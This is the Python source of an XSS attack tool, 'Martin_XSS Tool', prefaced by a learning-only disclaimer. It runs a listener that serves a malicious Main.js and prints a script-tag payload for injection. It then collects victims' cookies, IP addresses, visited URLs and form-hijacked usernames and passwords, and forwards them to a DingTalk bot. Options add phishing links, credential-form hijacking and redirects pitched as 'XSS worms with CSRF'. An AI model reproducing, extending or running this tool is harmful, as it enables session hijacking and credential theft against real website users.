#!/usr/bin/python3
# @Martin
import base64
import json
import socket
import sys
import os
import argparse
import textwrap
import threading
import datetime
import requests
import re
Version = "V3.5.2"
Title='''Github==>https://github.com/MartinxMax\n<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任\n<Disclaimer>: 
This tool is only for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities'''
Ding_talk_headers = {'Content-Type': 'application/json;charset=utf-8'}
Logo='''
  __  __                  _     _                   __   __   _____    _____  __      __  ____        _____       ___  
 |  \/  |                | |   (_)                  \ \ / /  / ____|  / ____| \ \    / / |___ \      | ____|     |__ \ 
 | \  / |   __ _   _ __  | |_   _   _ __    ______   \ V /  | (___   | (___    \ \  / /    __) |     | |__          ) |
 | |\/| |  / _` | | '__| | __| | | | '_ \  |______|   > <    \___ \   \___ \    \ \/ /    |__ <      |___ \        / / 
 | |  | | | (_| | | |    | |_  | | | | | |           / . \   ____) |  ____) |    \  /     ___) |  _   ___) |  _   / /_ 
 |_|  |_|  \__,_| |_|     \__| |_| |_| |_|          /_/ \_\ |_____/  |_____/      \/     |____/  (_) |____/  (_) |____|
                                                                                                                       
                                                                                                                       '''
 
 
 
def Get_LoackHost():
    if socket.gethostbyname(socket.gethostname()).startswith('127'):
        return os.popen("ifconfig eth0 | awk -F \"[^0-9.]+\" 'NR==2{print $2}'").read().strip()
    else:
        return socket.gethostbyname(socket.gethostname())   
class TCPINFO():
    def __init__(self, args):
        self.args = args
        self.LPORT = args.LPORT
        self.LHOST = args.LHOST
        self.Transmission_mode = args.Transmission_mode
        self.RPORTS = args.RPORTS
        self.RHOSTS = args.RHOSTS
        self.Table_hijack = args.Table_Hijack
        self.Table_Username = args.Table_Username
        self.Table_Password = args.Table_Password
        self.Table_ButtonName=args.Table_ButtonName
        self.Redirect_Page = args.Redirect_Page
        self.DingTalk_Config = args.DingTalk_Config_File
        self.DingTalk_Token = args.DingTalk_Token
        self.DingTalk_Key = args.DingTalk_Key


    def run(self):
        if not self.DingTalk_Test():
            sys.exit(0)
        PAYLOAD = f"[+]Payload=> <script src=\"{self.Transmission_mode and self.RHOSTS or 'http://'+Get_LoackHost()}{':'+str(self.RPORTS) if self.RPORTS else (':'+str(self.LPORT) if not self.Transmission_mode else '')}/Main.js\"></script>"
        if self.Table_hijack:
            PAYLOAD += f"\n [+]Phishing link=>{self.Transmission_mode and self.RHOSTS or 'http://'+Get_LoackHost()}{':'+str(self.RPORTS) if self.RPORTS else (':'+str(self.LPORT) if not self.Transmission_mode else '')}"
        print('-'*100,"\n",PAYLOAD,"\n",'-'*100)
        self.TCP_Listen()


    def TCP_Listen(self):
        TCP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        TCP.bind(("", self.LPORT))
        TCP.listen(50)
        while True:
            SOCK,_= TCP.accept()
            threading.Thread(
                target=self.Client, args=(SOCK,)
            ).start()


    def Send_Index_page(self,SOCK):
        with open('./index.html','rb')as f:
            Byte_Code = f.read()
        Head = "HTTP/1.1 200 OK\r\n"
        Head += f"content-length:{len(Byte_Code)}\r\n\r\n"
        SOCK.send(Head.encode())
        SOCK.send(Byte_Code)

        
    def Send_JS(self,SOCK):
        Rd_Payload=None
        with open('./Main.js','r')as f:
            Byte_Code=f.read()
        Head = "HTTP/1.1 200 OK\r\n"
        Byte_Code = Byte_Code.replace("@POC",f"{self.Transmission_mode and self.RHOSTS or 'http://'+Get_LoackHost()}{':'+str(self.RPORTS) if self.RPORTS else (':'+str(self.LPORT) if not self.Transmission_mode else '')}/JSONDATA"
        )
        if self.Table_hijack and self.Table_Username and self.Table_Password and self.Table_ButtonName:
            Byte_Code = Byte_Code.replace("var Button=null;", f"var Button=\"{self.Table_ButtonName}\""
                                                                     f";")
            Byte_Code = Byte_Code.replace("var User_Name_key=null;",f"var User_Name_key=\"{self.Table_Username}\""
                                                           f";")
            Byte_Code = Byte_Code.replace("var Password_Key=null;", f"var Password_Key=\"{self.Table_Password}\""
                                                                     f";")
        if self.Redirect_Page:
            Byte_Code=Byte_Code.replace("var Rd_Path=null;",f"var Rd_Path='window.location.href=\"{self.Redirect_Page}\""
                                                         f"';")
        Head += f"content-length:{len(Byte_Code)}\r\n\r\n"
        SOCK.send(Head.encode())
        SOCK.send(Byte_Code.encode())


    def Client(self,SOCK):
        DATA = SOCK.recv(1024).decode('utf-8')
        
        if "GET /Main.js" in DATA:
            print(f"[+] <Main.js> Accessed ----[{datetime.datetime.now().strftime('%Y/%m/%d %H:%M:%S')}]")
            self.Send_JS(SOCK)
        elif "{" in DATA and "JSONDATA" in DATA: 
            self.Get_User_Information_And_Display(DATA)
        else:
            print(f"[+] <Index.html> Accessed ----[{datetime.datetime.now().strftime('%Y/%m/%d %H:%M:%S')}]")
            self.Send_Index_page(SOCK) 
        SOCK.close()


    def Get_User_Information_And_Display(self,DATA):
        User_INFO = json.loads(re.search(r'{(.*?)}', DATA).group())
        for Key,Value in User_INFO.items():
            User_INFO[Key]=self.Decrypt(Value)
        Dis_Info =f'''
------------------------------------------------------------------------------
[+]Time:{User_INFO['Time']}\tVisit_URL:{User_INFO['Visit_URL']}\tHost_Type:{User_INFO['Host_Type']}
   IP:{User_INFO['IP']}\tCookie:{User_INFO['Cookies']}\tNetWork:{User_INFO['NetWork']} 
   Hijack: Username:{User_INFO['Username']} Password:{User_INFO['Password']}
-----------------------------------------------------------------------------       
'''
        print(Dis_Info)
        if self.Redirect_Page:
            print(f"[+]{User_INFO['IP']} Redirect To >>> {self.Redirect_Page}")
        if self.DingTalk_Token and self.DingTalk_Key:
            self.DingTalk_Send(Dis_Info+( f"{User_INFO['IP']} Redirect To >>> {self.Redirect_Page}" if self.Redirect_Page else ""))


    def Decrypt(self,str):
        try:
            str=base64.b64decode(str).decode("utf-8")
        except:
            pass
        return str


    def Get_DingTalk_Config_File(self):
        try:
            with open('DingTalk.conf','r')as f:
                Note = json.loads(f.read())
        except:
            return False
        else:
            if Note['Token'] and Note['Key_Word']:
                self.DingTalk_Token=Note['Token']
                self.DingTalk_Key=Note['Key_Word']
                return True
            else:
                return False


    def DingTalk_Test(self):
        if self.DingTalk_Config:
            if self.Get_DingTalk_Config_File():
                print("[+]Load DingTalk.conf Success !")
                if self.DingTalk_Send("Robot Online"):
                    print("[+]Push module is normal")
                    return True
                else:
                    print("[!]Push module is abnormal")
                    return False
            else:
                print("[!]Your DingTalk.conf file parameters are incorrect")
                return False
        else:
            if self.DingTalk_Token and self.DingTalk_Key:
                if self.DingTalk_Send("Robot Online"):
                    print("[+]Push module is normal")
                    return True
                else:
                    print("[!]Push module is abnormal")
                    return False
            elif self.DingTalk_Token or self.DingTalk_Key:
                print("[Warning!]You must fill in the parameters -dt and -dk")
                return False
            else:
                return True


    def DingTalk_Send(self,Push_Message):
        DATA=None
        Message = {
            "text": {
                "content": f"=={self.DingTalk_Key}==\n{Push_Message}"
            },
            "msgtype": "text"
        }
        try:
            DATA = requests.post(f"https://oapi.dingtalk.com/robot/send?access_token={self.DingTalk_Token}",
                         headers=Ding_talk_headers
                         , json=Message)
        except:
            pass
        finally:
            if DATA.status_code == 200:
                print("[+]Message Push DingTalk ------[Success]")
                return True
            else:
                print("[!]Message Push DingTalk ------[Fail]")
                return False


def main():
    print(Logo,"\n",Title)
    parser = argparse.ArgumentParser(
        description=f'Martin_XSS Tool ---Martin {Version}',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Usage:
           python3 %s --> You can enable the default intranet port 8888 to listen without adding any parameters
           python3 %s -lp xxxx  --> You can add the - p parameter to specify the port
           python3 %s -dt xxxxx... -dk xxx --> You can push the results
           python3 %s -dcf --> You can use the parameter options directly after filling in the configuration file DingTalk.conf
           python3 %s -rd "http://xxxx.com" --> You can use the redirect option to create XSS worms with CSRF
           python3 %s -table -button xxx -user xxx -pass xxx --> You can hijack the form
           python3 %s -t -rh xxx.xxx.xxx.xxx (-rp xxxx) --> You can join the IP and port penetrated by your intranet
            '''% (sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0],sys.argv[0])))
    parser.add_argument('-lp', '--LPORT', type=int, default=8888, help='Listen port')
    parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='Currently in the development stage, you don\'t need to carry this parameter')
    parser.add_argument('-t', '--Transmission_mode', action='store_true', help='Intranet penetration mode')
    parser.add_argument('-rh', '--RHOSTS', default=Get_LoackHost(), help='Remote IP')
    parser.add_argument('-rp', '--RPORTS', default=None, help='Remote PORT')
    parser.add_argument('-dcf', '--DingTalk_Config_File', action='store_true', help='DingTalk_Config_File')
    parser.add_argument('-dt','--DingTalk_Token', default=None, help='DingTalk_Token')
    parser.add_argument('-dk','--DingTalk_Key', default=None, help='DingTalk_Key')
    parser.add_argument('-rd', '--Redirect_Page', default=None, help='Redirect_Page')
    parser.add_argument('-table', '--Table_Hijack', action='store_true', help='Table_hijack')
    parser.add_argument('-button', '--Table_ButtonName', default=None, help='Table_ButtonName')
    parser.add_argument('-user', '--Table_Username', default=None, help='Table_Username')
    parser.add_argument('-pass', '--Table_Password', default=None, help='Table_Password')
    args = parser.parse_args()
    TCPINFO(args).run()


if __name__ == '__main__':
    main()